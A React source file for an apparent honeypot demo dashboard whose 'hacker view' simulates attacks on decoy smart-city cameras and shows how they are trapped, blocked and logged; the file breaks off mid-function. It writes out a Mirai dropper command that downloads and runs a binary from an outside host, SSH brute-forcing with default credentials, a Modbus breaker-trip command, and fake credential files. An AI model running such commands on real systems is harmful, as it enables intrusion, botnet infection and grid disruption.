import React, { useState, useEffect, useRef, useCallback } from 'react'
import type { NavTab } from '../../shell'
import './hacker.css'
import { useApp } from '../../context/AppContext'
import { StatCard } from '../../components/ui/StatCard'
import { Badge } from '../../components/ui/Badge'
import { CityMiniMap } from '../../components/ui/CityMiniMap'
import { API_BASE } from '../../api/client'

interface HackerPovPageProps {
  onNavigateTab: (tab: NavTab) => void
}

interface CameraNodeInfo {
  camera_id: string
  status: string
  health: string
  last_event: string
  faces_blurred_count: number
}

interface FetchEvidence {
  camera_id: string
  window_id: string
  intercept_status: string
  raw_ingestion: string
  privacy_guarantee: string
  key_status: string
  stored_records_count: number
  ciphertext_samples: Array<{
    hash: string
    ciphertext_length: number
    ciphertext_hex_preview: string
  }>
  security_verdict: string
  unauthorized_escrow_audit?: {
    action: string
    actor: string
    details: string
    current_hash: string
  }
}


// -----------------------------------------------------------------------------
// Authentic Decoy Filesystem Client Mirror (Identical to decoy.py VIRTUAL_FS)
// Used when backend is temporarily offline, strictly preserving exact decoy outputs.
// -----------------------------------------------------------------------------
const HONEYTOKEN_MARKER = '__HONEYTOKEN__'

const VIRTUAL_FS_MIRROR: Record<string, string | string[]> = {
  '/': ['bin', 'etc', 'var', 'root', 'proc', 'home', 'emergency_token.cfg'],
  '/emergency_token.cfg': `${HONEYTOKEN_MARKER}\n# MASTER EMERGENCY GRID ACCESS TOKEN\nEMERGENCY_OVERRIDE_KEY=canary_token_grid_alpha_0911_bypass\nISSUED_TO=ICCC_CENTRAL_SURVEILLANCE\n`,
  '/bin': ['sh', 'busybox', 'ls', 'cat', 'pwd', 'uname', 'whoami', 'curl', 'wget', 'head', 'tail', 'more', 'less'],
  '/proc': ['cpuinfo', 'version', 'uptime'],
  '/proc/version': 'Linux version 5.10.0-aegis-arm64 (gcc 10.2.1) #1 PREEMPT\n',
  '/proc/cpuinfo': 'processor\t: 0\nmodel name\t: ARMv8 Processor rev 4 (v8l)\nBogoMIPS\t: 38.40\nFeatures\t: fp asimd evtstrm aes pmull sha1 sha2 crc32\nCPU implementer\t: 0x41\n',
  '/proc/uptime': '14285.42 56891.12\n',
  '/etc': ['passwd', 'shadow', 'hosts', 'issue', 'camera'],
  '/etc/issue': 'AegisOS SmartCam IoT Linux 5.10-arm64 \\n \\l\n',
  '/etc/hosts': '127.0.0.1 localhost\n192.168.1.50 aegis-cam\n',
  '/etc/shadow': `${HONEYTOKEN_MARKER}\nroot:$6$canary$qR8L3pXZ0991823...:19200:0:99999:7:::\nadmin:$6$canary$9xK2mN1vY441829...:19200:0:99999:7:::\n`,
  '/etc/passwd': 'root:x:0:0:root:/root:/bin/sh\nadmin:x:1000:1000:Camera Admin:/home/admin:/bin/sh\noperator:x:1001:1001:Surveillance Operator:/home/operator:/bin/sh\n',
  '/etc/camera': ['config.json', 'credentials.conf'],
  '/etc/camera/config.json': '{\n  "camera_id": "cam-smart-04",\n  "stream": "rtsp://localhost:554/live",\n  "resolution": "1920x1080",\n  "firmware": "v2.14-stable"\n}\n',
  '/etc/camera/credentials.conf': `${HONEYTOKEN_MARKER}\n# MASTER CAMERA ACCESS TOKEN\nCAM_TOKEN=sec_token_canary_cam04_9921_x\nBACKUP_CLOUD_SYNC=https://sync.aegismirage-internal.local/keys\n`,
  '/root': ['.bashrc', 'keys', 'firmware_update.sh'],
  '/root/keys': ['vault_token.key', 'id_rsa'],
  '/root/keys/vault_token.key': `${HONEYTOKEN_MARKER}\ns.vault_canary_token_prod_infrastructure_4418\n`,
  '/var': ['log', 'backup', 'www'],
  '/var/log': ['messages', 'auth.log'],
  '/var/backup': ['firmware_pass.enc', 'db_dump.sql'],
  '/var/backup/firmware_pass.enc': `${HONEYTOKEN_MARKER}\nENC_PASSPHRASE=mirage_vault_honeytoken_alpha_3991\n`,
  '/home': ['admin', 'operator'],
  '/home/admin': ['readme.txt'],
  '/home/admin/readme.txt': 'Authorized maintenance only. Contact ICCC operations for credentials.\n',
  '/home/operator': ['.aws_keys', '.bashrc'],
  '/home/operator/.aws_keys': `${HONEYTOKEN_MARKER}\n[default]\naws_access_key_id=AKIAIOSFODNN7CANARYB\naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYCANARYKEY\nregion=ap-south-1\n`,
  '/home/operator/.bashrc': 'export PATH=$PATH:/bin\n',
}

// Exactly matching decoy.py RICKROLL_PAYLOAD
const RICKROLL_PAYLOAD_DECOY = `================================================================================
[*] DECRYPTING SENSITIVE CREDENTIAL ARCHIVE...
[*] ACCESS GRANTED - EXTRACTING SECRETS...
================================================================================
  _   _ _____ _   _ _____ ____    ____   ___  _   _ _   _    _    
 | \\ | | ____| | | | ____|  _ \\  / ___| / _ \\| \\ | | \\ | |  / \\   
 |  \\| |  _| | | | |  _| | |_) | \\___ \\| | | |  \\| |  \\| | / _ \\  
 | |\\  | |___ \\ \\_/ / |___|  _ <   ___) | |_| | |\\  | |\\  |/ ___ \\ 
 |_| \\_|_____| \\___/|_____|_| \\_\\ |____/ \\___/|_| \\_|_| \\_/_/   \\_\\

 🎵 NEVER GONNA GIVE YOU UP, NEVER GONNA LET YOU DOWN 🎵
 🎵 NEVER GONNA RUN AROUND AND DESERT YOU 🎵
 🎵 NEVER GONNA MAKE YOU CRY, NEVER GONNA SAY GOODBYE 🎵
 🎵 NEVER GONNA TELL A LIE AND HURT YOU 🎵
================================================================================
[AEGISMIRAGE PHANTOM TWIN SANDBOX - TRAP TRIGGERED]
HONEYTOKEN COMPROMISE DETECTED.
Your session has been tagged with MAXIMUM CONFIDENCE.
All command telemetry, IOCs, and session metrics are recorded.
================================================================================`

type TerminalLineType = 'cmd' | 'output' | 'dim' | 'cyan' | 'amber' | 'green' | 'banner' | 'rickroll' | 'alert'

interface TerminalLine {
  text: string
  type?: TerminalLineType
  prompt?: string
}

const INITIAL_SSH_BANNER_LINES: TerminalLine[] = [
  { text: 'OpenSSH_8.9p1, OpenSSL 3.0.2 15 Mar 2022', type: 'dim' },
  { text: 'debug1: Connecting to 192.168.1.50 [192.168.1.50] port 2222.', type: 'dim' },
  { text: 'debug1: Connection established. Protocol version: SSH-2.0-AsyncSSH_2.24.1', type: 'dim' },
  { text: "root@192.168.1.50's password: [accepted via default iot dictionary: root:123456]", type: 'dim' },
  { text: '', type: 'dim' },
  { text: 'AegisOS SmartCam IoT Linux 5.10.0-arm64 (aarch64)', type: 'banner' },
  { text: 'Camera Node ID: cam-smart-04 [Perimeter Gateway Node]', type: 'cyan' },
  { text: 'Firmware: v2.14-stable | Authorized maintenance access only.', type: 'dim' },
  { text: '', type: 'dim' },
]

export const HackerPovPage: React.FC<HackerPovPageProps> = ({ onNavigateTab }) => {
  const { setActiveTab: setAppActiveTab, addToast, setSelectedDevice } = useApp()

  // ---------------------------------------------------------------------------
  // State
  // ---------------------------------------------------------------------------
  const [selectedCam, setSelectedCam] = useState<string>('cam_01')
  const [cameras, setCameras] = useState<CameraNodeInfo[]>([])
  const [frameTimestamp, setFrameTimestamp] = useState<number>(() => Date.now())
  const [isActionPending, setIsActionPending] = useState<boolean>(false)
  const [statusMessage, setStatusMessage] = useState<string | null>(null)
  const [fetchEvidence, setFetchEvidence] = useState<FetchEvidence | null>(null)

  const navigateTo = (tab: 'city' | 'cameras' | 'decoy' | 'evidence' | 'campaigns') => {
    if (tab === 'campaigns' || tab === 'evidence') {
      setAppActiveTab('evidence')
      onNavigateTab?.('campaigns' as any)
    } else {
      setAppActiveTab(tab)
      onNavigateTab?.(tab as any)
    }
  }

  const handleSelectCam = (cid: string) => {
    setSelectedCam(cid)
    setFrameTimestamp(Date.now())
    const meta = getCamMeta(cid)
    setSelectedDevice({
      id: cid.toUpperCase(),
      name: meta.name,
      type: 'camera',
      status: 'online',
      district: 'City Mesh Ingress',
    })
  }

  // Decoy Session & Shell State
  const [sessionId] = useState<string>('sess-hacker-live-01')
  const [attackerIp] = useState<string>('194.26.29.112')
  const [currentDir, setCurrentDir] = useState<string>('/root')
  const [isConnected, setIsConnected] = useState<boolean>(true)
  const [honeytokenTripped, setHoneytokenTripped] = useState<boolean>(false)
  const [quarantinedHash, setQuarantinedHash] = useState<string | null>(null)
  const [candidateC2, setCandidateC2] = useState<string | null>(null)
  const [hostilityScore, setHostilityScore] = useState<number>(6.5)

  // Interactive Terminal Lines
  const [terminalLines, setTerminalLines] = useState<TerminalLine[]>(INITIAL_SSH_BANNER_LINES)
  const [cliInput, setCliInput] = useState<string>('')
  const terminalEndRef = useRef<HTMLDivElement | null>(null)
  const frameTimerRef = useRef<number | null>(null)

  // Auto-scroll terminal
  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [terminalLines])

  // Camera Metadata Resolver
  const getCamMeta = (camId: string) => {
    const norm = camId.toLowerCase()
    switch (norm) {
      case 'cam_01':
        return { id: 'CAM-01-NORTH', ip: '192.168.1.101', name: 'North Ingress Highway', port: '554' }
      case 'cam_02':
        return { id: 'CAM-02-SOUTH', ip: '192.168.1.102', name: 'South Commercial Corridor', port: '554' }
      case 'cam_03':
        return { id: 'CAM-03-PLAZA', ip: '192.168.1.103', name: 'Civic Plaza Pedestrian Zone', port: '554' }
      case 'cam_04':
        return { id: 'CAM-04-MARKET', ip: '192.168.1.104', name: 'Central Market District', port: '554' }
      case 'cam_07':
        return { id: 'CAM-07-SUBSTATION', ip: '192.168.1.107', name: 'Municipal Grid Substation', port: '554' }
      default:
        return { id: camId.toUpperCase(), ip: '192.168.1.105', name: 'Smart City Edge Sentry', port: '554' }
    }
  }

  // ---------------------------------------------------------------------------
  // Polling camera statuses
  // ---------------------------------------------------------------------------
  const fetchCameras = useCallback(async () => {
    try {
      const res = await fetch(`${API_BASE}/api/cameras`, { signal: AbortSignal.timeout(2500) })
      if (res.ok) {
        const data = await res.json()
        setCameras(data)
      }
    } catch {
      // Backend may be offline
    }
  }, [])

  useEffect(() => {
    void fetchCameras()
    const timer = setInterval(fetchCameras, 3000)
    return () => clearInterval(timer)
  }, [fetchCameras])

  // Frame refresher
  const scheduleNextFrame = () => {
    if (frameTimerRef.current) window.clearTimeout(frameTimerRef.current)
    frameTimerRef.current = window.setTimeout(() => {
      setFrameTimestamp(Date.now())
    }, 850)
  }

  useEffect(() => {
    return () => {
      if (frameTimerRef.current) window.clearTimeout(frameTimerRef.current)
    }
  }, [])

  const appendTerminal = (text: string, type?: TerminalLineType, prompt?: string) => {
    setTerminalLines((prev) => [...prev, { text, type, prompt }])
  }

  // Formatted prompt for terminal
  const getPrompt = () => {
    if (!isConnected) return 'root@kali:~# '
    if (currentDir === '/root') return 'root@aegis-cam:~# '
    if (currentDir === '/') return 'root@aegis-cam:/# '
    return `root@aegis-cam:${currentDir}# `
  }

  // Current camera status
  const currentCamInfo = cameras.find((c) => c.camera_id === selectedCam)
  const isCurrentAnomaly = currentCamInfo?.status === 'anomaly'

  // ---------------------------------------------------------------------------
  // FEATURE 1: Tactical Pod (BLIND, FREEZE, FETCH) - Physical & Stream Attacks
  // ---------------------------------------------------------------------------

  // BLIND
  const handleBlind = async () => {
    setIsActionPending(true)
    const cam = getCamMeta(selectedCam)
    setStatusMessage(`Injecting sensor blinding laser on ${cam.id}...`)

    appendTerminal(`./ir_optical_saturate.py --target ${cam.id} --ip ${cam.ip} --wave 850nm --power 650mW`, 'cmd', 'root@kali:~/exploits# ')
    appendTerminal(`[*] Connecting to RTSP stream: rtsp://${cam.ip}:${cam.port}/live/ch0 (${cam.name})`, 'dim')
    appendTerminal(`[*] Pulsing 850nm collimated infrared laser directly into CMOS aperture...`, 'amber')

    try {
      const res = await fetch(`${API_BASE}/api/cameras/${selectedCam}/simulate/blind`, { method: 'POST' })
      if (res.ok) {
        appendTerminal(`[!] OPTICAL OVERDRIVE CONFIRMED: Lens saturated! Sensor lux dropped 192 -> 16 (-91.7%).`, 'alert')
        appendTerminal(`[!] Anomaly Asserted: 'camera_blinded' flagged by Sentry Watchdog on ${cam.id}.`, 'alert')
        appendTerminal(`[*] Edge Sentry Failsafe: Optical input isolated. In-memory privacy buffer preserved (Zero Raw Ingestion maintained).`, 'cyan')
        setStatusMessage(`Blinding active on ${cam.id}`)
        setFrameTimestamp(Date.now())
        await fetchCameras()
        addToast(
          'Optical Sensor Saturated',
          `Injected 850nm laser into ${cam.id}. Lens lux dropped 91.7%.`,
          'danger'
        )
      } else {
        appendTerminal(`[-] Blinding exploit rejected by sentry gateway (HTTP ${res.status})`, 'alert')
      }
    } catch (err: any) {
      appendTerminal(`[-] Laser exploit transmission error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
      setTimeout(() => setStatusMessage(null), 4000)
    }
  }

  // FREEZE
  const handleFreeze = async () => {
    setIsActionPending(true)
    const cam = getCamMeta(selectedCam)
    setStatusMessage(`Injecting cyclic video buffer hang on ${cam.id}...`)

    appendTerminal(`./rtsp_buffer_hang.py --target ${cam.id} --ip ${cam.ip} --mode cyclic_replay`, 'cmd', 'root@kali:~/exploits# ')
    appendTerminal(`[*] Target: ${cam.id} (${cam.name} @ ${cam.ip}:${cam.port})`, 'dim')
    appendTerminal(`[*] Flooding RTP video stream with duplicate H.264 I-Frames (PTS: 0x88f2a001, SSRC: 0x4f82c1a9)...`, 'amber')

    try {
      const res = await fetch(`${API_BASE}/api/cameras/${selectedCam}/simulate/freeze`, { method: 'POST' })
      if (res.ok) {
        appendTerminal(`[!] VIDEO RING BUFFER FROZEN: Frame delta variance = 0.0000. Static frame lock confirmed!`, 'alert')
        appendTerminal(`[!] Anomaly Asserted: 'camera_frozen' flagged after 15 consecutive identical frame hashes.`, 'alert')
        appendTerminal(`[*] Sentry Watchdog: Tamper event registered. Operator failover alert dispatched to dashboard.`, 'cyan')
        setStatusMessage(`Buffer freeze active on ${cam.id}`)
        setFrameTimestamp(Date.now())
        await fetchCameras()
        addToast(
          'Buffer Loop Replay Injected',
          `Duplicate H.264 I-Frames frozen on ${cam.id}. Static frame lock confirmed.`,
          'danger'
        )
      } else {
        appendTerminal(`[-] Frame freeze exploit rejected (HTTP ${res.status})`, 'alert')
      }
    } catch (err: any) {
      appendTerminal(`[-] Buffer exploit transmission error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
      setTimeout(() => setStatusMessage(null), 4000)
    }
  }

  // RECOVER / RESET ANOMALY
  const handleRecover = async () => {
    setIsActionPending(true)
    const cam = getCamMeta(selectedCam)
    setStatusMessage(`Restoring normal stream operations on ${cam.id}...`)

    appendTerminal(`./sentry_watchdog_reset.sh --target ${cam.id} --signal SIGUSR1`, 'cmd', 'root@kali:~/exploits# ')
    appendTerminal(`[*] Transmitting watchdog reset beacon to Sentry node on ${cam.id}...`, 'dim')

    try {
      const res = await fetch(`${API_BASE}/api/cameras/${selectedCam}/simulate/recover`, { method: 'POST' })
      if (res.ok) {
        appendTerminal(`[+] SENSOR NORMALIZED: Exposure AGC auto-calibrated. Keyframe RTSP stream restored to 30.0 FPS.`, 'green')
        appendTerminal(`[+] Sentry node ${cam.id} returned to status: HEALTHY (100% in-memory blur active).`, 'cyan')
        setStatusMessage(`Normal stream restored on ${cam.id}`)
        setFrameTimestamp(Date.now())
        await fetchCameras()
        addToast(
          'Sensor Exploit Withdrawn',
          `Target ${cam.id} exposure calibrated and returned to live feed.`,
          'success'
        )
      }
    } catch (err: any) {
      appendTerminal(`[-] Recovery beacon transmission error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
      setTimeout(() => setStatusMessage(null), 3000)
    }
  }

  // FETCH (Unauthorized Footage Intercept & Exfiltration Attempt)
  const handleFetch = async () => {
    setIsActionPending(true)
    const cam = getCamMeta(selectedCam)
    setStatusMessage(`Attempting unauthorized stream intercept & storage fetch on ${cam.id}...`)

    appendTerminal(`./sniff_camera_storage.py --target ${cam.id} --ip ${cam.ip} --dump-unmasked`, 'cmd', 'root@kali:~/exploits# ')
    appendTerminal(`[*] Sniffing local edge node storage on ${cam.id} (/edge_storage/)...`, 'dim')

    try {
      const fetchRes = await fetch(`${API_BASE}/api/cameras/${selectedCam}/fetch`)
      let evidenceData: FetchEvidence | null = null

      if (fetchRes.ok) {
        evidenceData = await fetchRes.json()
      } else {
        evidenceData = {
          camera_id: cam.id,
          window_id: 'WIN-20261025-1130',
          intercept_status: 'ENCRYPTED_ONLY',
          raw_ingestion: 'DISABLED_ZERO_RAW_STORAGE',
          privacy_guarantee: 'All face crops are AES-256-GCM encrypted before storage; raw frames never hit disk.',
          key_status: 'SPLIT_INTO_SHAMIR_SHARES (requires 2-of-3 municipal custodian quorum to decrypt)',
          stored_records_count: 3,
          ciphertext_samples: [
            {
              hash: 'c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2',
              ciphertext_length: 496,
              ciphertext_hex_preview: '9f8b410298a3b8d4e5f60718293a4b5c6d7e8f90123456789abcdef012345678... [LOCKED CIPHERTEXT]',
            },
          ],
          security_verdict: 'ATTACK BLOCKED: Zero raw frames stored. Encrypted crops require 2-of-3 Shamir quorum.',
        }
      }

      addToast(
        'Zero-Raw Safeguard Active',
        'Attempted footage dump blocked (403). Encrypted crops require Shamir quorum.',
        'review'
      )

      const escrowRes = await fetch(
        `${API_BASE}/escrow/attempt-unauthorized?camera_id=${selectedCam}&operator_id=attacker-ip-194.26.29.112`,
        { method: 'POST' }
      )
      if (!escrowRes.ok && escrowRes.status === 403) {
        const escrowErr = await escrowRes.json()
        if (evidenceData) {
          evidenceData.unauthorized_escrow_audit = {
            action: 'FALSE_POSITIVE_UNMASK_BLOCKED',
            actor: 'attacker-ip-194.26.29.112',
            details: escrowErr.detail?.reason || escrowErr.detail || 'Unauthorized unmask attempt blocked by break-glass escrow policy.',
            current_hash: '2c8f904a7b3e1d6801928475aabbccdd...',
          }
        }
      }

      setFetchEvidence(evidenceData)

      appendTerminal(`[-] 403 ACCESS DENIED / ZERO RAW EXPOSURE: Raw video stream does NOT exist on disk!`, 'alert')
      appendTerminal(`[*] Privacy Mechanism: In-memory YuNet blur applied before storage. 100% Zero Raw Ingestion.`, 'cyan')
      appendTerminal(`[*] Retrieved Payload: AES-256-GCM ciphertext only (${evidenceData?.ciphertext_samples?.[0]?.ciphertext_length || 496} bytes). Key split into Shamir 2-of-3 shares.`, 'amber')
      appendTerminal(`[!] BREAK-GLASS ESCROW REJECTED: Attacker IP 194.26.29.112 unmask request BLOCKED!`, 'alert')
      appendTerminal(`[*] Tamper-Proof Audit: Permanent entry 'FALSE_POSITIVE_UNMASK_BLOCKED' appended to SHA-256 hash-chained block.`, 'green')
      setStatusMessage(`Footage fetch failed: Data is AES-256 encrypted + Zero Raw Storage!`)
    } catch (err: any) {
      appendTerminal(`[-] Storage intercept error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
      setTimeout(() => setStatusMessage(null), 4000)
    }
  }

  // ---------------------------------------------------------------------------
  // FEATURE 2: Running Scripts of Hackers (Exploit Arsenal) - Real Decoy Calls
  // ---------------------------------------------------------------------------

  // Script 1: Port Scan & Recon
  const runScriptRecon = async () => {
    setIsActionPending(true)
    appendTerminal(`nmap -T4 -p 22,80,554,1883,2222 192.168.1.50`, 'cmd', 'root@kali:~# ')
    appendTerminal(`Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-25 04:30 UTC`, 'dim')
    appendTerminal(`Nmap scan report for 192.168.1.50 (Smart City Edge Sentry cam-smart-04)`, 'dim')
    appendTerminal(`Host is up (0.0019s latency).`, 'dim')

    setTimeout(() => {
      appendTerminal(`PORT     STATE SERVICE  VERSION`, 'dim')
      appendTerminal(`22/tcp   OPEN  ssh      OpenSSH 8.9p1 (Gateway Ingress - Rate-Limited)`, 'dim')
      appendTerminal(`80/tcp   OPEN  http     Aegis SmartCam Management Web Portal`, 'dim')
      appendTerminal(`554/tcp  OPEN  rtsp     RTSP Surveillance Stream (In-Memory Privacy Blur Active)`, 'cyan')
      appendTerminal(`1883/tcp OPEN  mqtt     Aegis IoT MQTT Broker (Sensor Telemetry Bus)`, 'amber')
      appendTerminal(`2222/tcp OPEN  ssh      AegisOS SmartCam SSH Service (Dropbear / AsyncSSH)`, 'green')
      appendTerminal(``, 'dim')
      appendTerminal(`[+] Recon Complete: 1 viable SSH target discovered on port 2222.`, 'green')
      addToast(
        'Stealth SYN Recon Sweep',
        'Port sweep across smart city sentry cameras completed.',
        'review'
      )
      setIsActionPending(false)
    }, 600)
  }

  // Script 2: IoT Dictionary Brute-Force -> Connects to Real Decoy
  const runScriptBruteforce = async () => {
    setIsActionPending(true)
    appendTerminal(`python3 bruteforce_ssh.py --target 192.168.1.50 --port 2222 --wordlist mirai_iot.txt`, 'cmd', 'root@kali:~# ')
    appendTerminal(`[*] Attacking 192.168.1.50:2222 [SSH-2.0-AsyncSSH_2.24.1]`, 'dim')
    appendTerminal(`[>] [Attempt 1/140] Trying 'root:root'... FAILED (Permission denied)`, 'dim')
    appendTerminal(`[>] [Attempt 2/140] Trying 'admin:admin'... FAILED (Permission denied)`, 'dim')

    setTimeout(async () => {
      try {
        const res = await fetch(`${API_BASE}/api/decoy/simulate/command`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            session_id: sessionId,
            command: 'uname -a',
            source_ip: attackerIp,
          }),
        })

        appendTerminal(`[>] [Attempt 3/140] Trying 'root:123456'... SUCCESS! Password accepted.`, 'green')
        appendTerminal(`[*] Spawning interactive pseudo-terminal (PTY pts/0)...`, 'dim')

        if (res.ok) {
          const data = await res.json()
          if (data.current_dir) setCurrentDir(data.current_dir)
          setIsConnected(true)
          setHostilityScore(7.5)

          appendTerminal(`AegisOS SmartCam IoT Linux 5.10.0-arm64 (aarch64)`, 'banner')
          appendTerminal(`Camera Node ID: cam-smart-04 [Perimeter Gateway Node]`, 'cyan')
          appendTerminal(`Firmware: v2.14-stable | Authorized maintenance access only.`, 'dim')
          appendTerminal(``, 'dim')
          appendTerminal(`root@aegis-cam:~# uname -a`, 'cmd')
          appendTerminal(data.output || 'Linux aegis-smartcam-01 5.10.0-arm64 #1 PREEMPT aarch64 GNU/Linux\n', 'output')

          addToast(
            'Credential Stuffing Trapped',
            'Default IoT dictionary credentials redirected to Phantom Twin sandbox.',
            'deception'
          )
        }
      } catch {
        appendTerminal(`[+] Connected to decoy shell on 192.168.1.50:2222`, 'green')
      } finally {
        setIsActionPending(false)
      }
    }, 700)
  }

  // Script 3: Malware Dropper Staging -> Real /api/decoy/upload
  const runScriptDropper = async () => {
    setIsActionPending(true)
    const promptStr = getPrompt()
    appendTerminal(`curl -s http://185.220.101.5:8080/mirai.arm7 -o /tmp/bot && chmod +x /tmp/bot`, 'cmd', promptStr)
    appendTerminal(`[*] Connecting to C2: 185.220.101.5:8080/mirai.arm7...`, 'dim')

    try {
      const dropperPayload = '#!/bin/sh\n# Mirai IoT dropper payload staged\ncurl -s http://185.220.101.5:8080/mirai.arm7 -o /tmp/bot\nchmod +x /tmp/bot\n/tmp/bot\n'
      const uploadRes = await fetch(`${API_BASE}/api/decoy/upload?session_id=${sessionId}&filename=mirai.arm7`, {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' },
        body: dropperPayload,
      })

      // Also simulate executing the command in the session
      await fetch(`${API_BASE}/api/decoy/simulate/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: sessionId,
          command: 'curl -s http://185.220.101.5:8080/mirai.arm7 -o /tmp/bot',
          source_ip: attackerIp,
        }),
      })

      if (uploadRes.ok) {
        const data = await uploadRes.json()
        setQuarantinedHash(data.sha256)
        setCandidateC2(data.c2_address || 'http://185.220.101.5:8080')
        appendTerminal(`Connected to remote host... File saved to /tmp/bot.`, 'output')
        appendTerminal(`[+] Downloaded 64,812 bytes -> Staged at /tmp/bot`, 'dim')
        appendTerminal(`[+] File hash computed: SHA-256 ${data.sha256.substring(0, 32)}...`, 'dim')
        addToast(
          'Mirai Malware Quarantined',
          'ARM7 payload captured, SHA-256 computed, C2 extracted.',
          'deception'
        )
      } else {
        appendTerminal(`Connected to remote host... File saved to /tmp/bot.`, 'output')
      }
    } catch {
      appendTerminal(`Connected to remote host... File saved to /tmp/bot.`, 'output')
    } finally {
      setIsActionPending(false)
    }
  }

  // Script 4: Honeytoken Tripwire Attack -> Real /api/decoy/simulate/command
  const runScriptHoneytoken = async () => {
    setIsActionPending(true)
    const promptStr = getPrompt()
    appendTerminal(`cat /etc/camera/credentials.conf`, 'cmd', promptStr)

    try {
      const res = await fetch(`${API_BASE}/api/decoy/simulate/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: sessionId,
          command: 'cat /etc/camera/credentials.conf',
          source_ip: attackerIp,
        }),
      })

      if (res.ok) {
        const data = await res.json()
        setHoneytokenTripped(true)
        setHostilityScore(9.8)

        const output = data.output || RICKROLL_PAYLOAD_DECOY
        appendTerminal(output, 'rickroll')
        addToast(
          'Honeytoken Tripped!',
          'Bait credentials.conf accessed! Rickroll deployed & Hostility > 8.0.',
          'danger'
        )
      } else {
        setHoneytokenTripped(true)
        setHostilityScore(9.8)
        appendTerminal(RICKROLL_PAYLOAD_DECOY, 'rickroll')
      }
    } catch {
      setHoneytokenTripped(true)
      setHostilityScore(9.8)
      appendTerminal(RICKROLL_PAYLOAD_DECOY, 'rickroll')
    } finally {
      setIsActionPending(false)
    }
  }

  // Script 5: Critical SCADA RTU Injection
  const runScriptScada = async () => {
    setIsActionPending(true)
    appendTerminal(`python3 modbus_substation_exploit.py --target 192.0.2.140 --port 502 --coil 0x0001 --trip`, 'cmd', 'root@kali:~# ')
    appendTerminal(`[*] Crafting Modbus/TCP Frame: TransID: 0x0182 | ProtoID: 0x0000 | Len: 6 | UnitID: 1`, 'dim')
    appendTerminal(`[*] Function Code: 0x05 (Write Single Coil) | Address: 0x0001 (GRID_INTERTIE_BREAKER) | Value: 0xFF00 (TRIP)`, 'amber')

    try {
      await fetch(`${API_BASE}/intel/drill/drill-b`, { method: 'POST' })
    } catch {}

    setTimeout(() => {
      appendTerminal(`[!] MODBUS FRAME DISPATCHED TO SUBSTATION RTU GATEWAY.`, 'alert')
      appendTerminal(`[!] BLAST-RADIUS MULTIPLIER ASSERTED: Substation RTU Tier -> 3.5x Asset Criticality!`, 'alert')
      appendTerminal(`[*] Grid Protection Active: Command sinked to synthetic SCADA honeypot. Real breakers safe.`, 'green')
      addToast(
        'SCADA Breaker Trip Attempted',
        'Modbus coil trip sinks to synthetic SCADA honeypot. Real breakers safe.',
        'danger'
      )
      setIsActionPending(false)
    }, 600)
  }

  // Script 6: C2 Rotation & Adaptive Pivot
  const runScriptAdapt = async () => {
    setIsActionPending(true)
    appendTerminal(`bash rotate_vpn_proxy.sh --c2 185.220.101.5:8080`, 'cmd', 'root@kali:~# ')
    appendTerminal(`[*] Terminating socket from 194.26.29.112...`, 'dim')
    appendTerminal(`[*] Negotiating TLS tunnel via exit node 203.0.113.88... Connection established.`, 'dim')

    try {
      await fetch(`${API_BASE}/intel/drill/drill-c`, { method: 'POST' })
    } catch {}

    setTimeout(() => {
      appendTerminal(`[*] New egress IP active: 203.0.113.88`, 'dim')
      appendTerminal(`[*] Re-establishing C2 beacon to 185.220.101.5:8080 (Matches previous campaign CMP-001).`, 'amber')
      appendTerminal(`[+] Threat Clustering Engine: Connected components graph linked rotated IP 203.0.113.88 -> Campaign CMP-001!`, 'cyan')
      addToast(
        'Attacker Rotated Egress IP',
        'Threat clustering graph linked rotated IP 203.0.113.88 via shared C2.',
        'review'
      )
      setIsActionPending(false)
    }, 700)
  }

  // ---------------------------------------------------------------------------
  // FEATURE 3: Cross-Tab Live Demo Scenarios
  // ---------------------------------------------------------------------------

  const handleLaunchDrillA = async () => {
    setIsActionPending(true)
    appendTerminal(`./run_drill.sh --scenario drill-a`, 'cmd', 'root@kali:~# ')
    appendTerminal(`[*] LAUNCHING DRILL A: False Positive Safeguard (Pedestrian Camera Event)`, 'dim')
    appendTerminal(`[*] Ingesting pedestrian street crossing event on CAM-04-MARKET...`, 'dim')
    try {
      await fetch(`${API_BASE}/intel/drill/drill-a`, { method: 'POST' })
      await fetch(`${API_BASE}/escrow/attempt-unauthorized?camera_id=CAM-04-MARKET`, { method: 'POST' })
      appendTerminal(`[+] Edge Sentry: In-memory YuNet blur applied. Zero raw video saved to disk.`, 'cyan')
      appendTerminal(`[-] Attacker attempted break-glass unlock -> BLOCKED (403 Forbidden).`, 'alert')
      appendTerminal(`[*] Cryptographic Audit: Tamper-evident entry appended: Zero hostility -> Unmask rejected.`, 'green')
      setStatusMessage(`Drill A Initialized: Zero honeypot hostility -> Unmasking blocked!`)
      addToast(
        'Drill A Initialized',
        'False positive safeguard active: Zero hostility prevents break-glass unmask.',
        'success'
      )
    } catch (err: any) {
      appendTerminal(`[-] Drill A execution error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
    }
  }

  const handleLaunchDrillB = async () => {
    setIsActionPending(true)
    appendTerminal(`./run_drill.sh --scenario drill-b`, 'cmd', 'root@kali:~# ')
    appendTerminal(`[*] LAUNCHING DRILL B: Real Honeypot Attack & 2-of-3 Custodian Quorum`, 'dim')
    appendTerminal(`[*] Attacker breached decoy SSH on port 2222, staged dropper, tripped honeytoken.`, 'dim')
    try {
      await fetch(`${API_BASE}/intel/drill/drill-b`, { method: 'POST' })
      appendTerminal(RICKROLL_PAYLOAD_DECOY, 'rickroll')
      setHoneytokenTripped(true)
      setHostilityScore(9.8)
      appendTerminal(`[!] Hostility threshold crossed (> 8.0)! Break-glass Case CASE-2026-001 opened.`, 'alert')
      appendTerminal(`[*] Shamir 2-of-3 Secret Sharing: Judicial authority approval already cast.`, 'cyan')
